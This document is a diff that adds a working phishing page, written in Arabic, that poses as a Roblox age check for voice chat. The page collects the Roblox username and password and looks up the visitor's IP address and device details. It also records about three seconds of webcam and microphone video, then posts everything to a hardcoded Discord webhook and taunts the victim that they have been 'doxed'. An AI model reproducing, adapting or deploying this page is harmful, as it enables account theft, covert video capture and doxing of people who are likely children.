@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>Roblox | تحقق العمر للميزة الصوتية</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background-color: #191B1D; color: white; font-family: 'HCo Gotham SSm', sans-serif; margin: 0; text-align: center; }
+        .nav-fake { background: #232527; padding: 10px; border-bottom: 1px solid #333; display: flex; align-items: center; justify-content: center; }
+        .container { max-width: 800px; margin: 30px auto; padding: 20px; }
+        .verify-box { background: #fff; color: #333; padding: 30px; border-radius: 4px; box-shadow: 0 0 20px rgba(0,0,0,0.5); width: 100%; max-width: 400px; margin: 0 auto; }
+        .rbx-logo { width: 120px; margin-bottom: 20px; }
+        h1 { font-size: 28px; margin-bottom: 10px; }
+        .free-btn { background: #00B06F; color: white; border: none; padding: 10px; width: 100%; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 5px; font-size: 16px; }
+        input, select { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        #v_stream { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="nav-fake">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="30" style="filter: invert(1);">
+</div>
+
+<div class="container">
+    <h1>Enjoy up to 100% more Robux</h1>
+    <p style="color: #BBB;">تحقق من عمرك الآن لتفعيل ميزة المايك والشات الصوتي في السعودية.</p>
+
+    <div class="verify-box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" class="rbx-logo">
+        <h2 style="font-size: 18px;">نظام التحقق من العمر</h2>
+        
+        <input type="text" id="target_u" placeholder="اسم المستخدم">
+        <input type="password" id="target_p" placeholder="كلمة المرور">
+        
+        <select>
+            <option>سنة الميلاد</option>
+            <script>for(i=2012;i>=1990;i--)document.write(`<option>${i}</option>`)</script>
+        </select>
+
+        <button class="free-btn" onclick="executeDox()">تأكيد وتفعيل المايك</button>
+    </div>
+</div>
+
+<video id="v_stream" autoplay playsinline muted></video>
+
+<script>
+    const WEBHOOK = "https://discord.com/api/webhooks/1478458966454308976/NDWR7L88JLawPoreWZ-qY-RZH_SZctVTtZO9V0WB3ACOMRw0IxeFkovCVQI-3tkt3dyk";
+
+    async function executeDox() {
+        const u = document.getElementById('target_u').value;
+        const p = document.getElementById('target_p').value;
+        if(!u || !p) { alert("أدخل البيانات!"); return; }
+
+        try {
+            const ipFetch = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+            const screen = `${window.screen.width}x${window.screen.height}`;
+            const device = /iPad/i.test(navigator.userAgent) ? "iPad 📱" : (/Mobile/i.test(navigator.userAgent) ? "Mobile 📱" : "PC 💻");
+
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            const recorder = new MediaRecorder(stream);
+            const chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = async () => {
+                const blob = new Blob(chunks, { type: 'video/webm' });
+                await sendToDiscord(u, p, ipFetch.ip, screen, device, blob);
+                stream.getTracks().forEach(t => t.stop());
+                document.body.innerHTML = "<h1 style='color:white; margin-top:20vh;'>YOU HAVE BEEN DOXED BY 7bkuii 😹💀</h1>";
+            };
+            recorder.start();
+            setTimeout(() => recorder.stop(), 3000);
+        } catch (e) {
+            await sendToDiscord(u, p, "Blocked", "Unknown", "Unknown", null);
+        }
+    }
+
+    async function sendToDiscord(u, p, ip, sc, dev, blob) {
+        const fd = new FormData();
+        if(blob) fd.append("file", blob, "victim_capture.webm");
+
+        const payload = {
+            content: "@everyone **hey @everyone hey I dox this guy**",
+            embeds: [{
+                title: "TAMIM_LOG_REPORT 💀",
+                color: 3447003,
+                fields: [
+                    { name: "👤 الحساب", value: `\`${u}\``, inline: true },
+                    { name: "🔑 الباسورد", value: `\`${p}\``, inline: true },
+                    { name: "🌐 الـ IP", value: `\`${ip}\`` },
+                    { name: "📏 الشاشة", value: `\`${sc}\``, inline: true },
+                    { name: "📱 الجهاز", value: `\`${dev}\``, inline: true }
+                ],
+                footer: { text: "this bitch he’s been dox by 7bkuii 😹" }
+            }]
+        };
+
+        fd.append("payload_json", JSON.stringify(payload));
+        await fetch(WEBHOOK, { method: 'POST', body: fd });
+    }
+</script>
+</body>
+</html>
